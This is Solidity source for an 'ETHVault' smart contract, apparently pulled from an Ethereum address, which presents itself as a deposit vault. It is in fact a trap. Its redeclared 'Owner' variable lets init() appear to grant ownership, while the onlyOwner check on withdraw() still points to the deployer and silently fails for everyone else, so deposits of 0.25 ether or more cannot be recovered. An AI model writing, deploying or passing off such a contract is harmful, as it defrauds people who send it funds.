/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETHVault at 0x96050da7c01bbd4891ed766720a5c1c79b824163
*/
pragma solidity ^0.4.12;

contract Owned {
    address public Owner;
    function Owned() { Owner = msg.sender; }
    modifier onlyOwner { if( msg.sender == Owner ) _; }
}

contract ETHVault is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;
    
    function init() payable { Owner = msg.sender; deposit(); }
    
    function() payable { deposit(); }
    
    function deposit() payable {
        if (!isContract(msg.sender))
            if (msg.value >= 0.25 ether)
                if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender])
                    Deposits[msg.sender] += msg.value;
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender])
            msg.sender.transfer(amount);
    }
    
    function isContract(address addr) payable returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function kill() payable onlyOwner {
        require(this.balance == 0);
        selfdestruct(msg.sender);
    }
}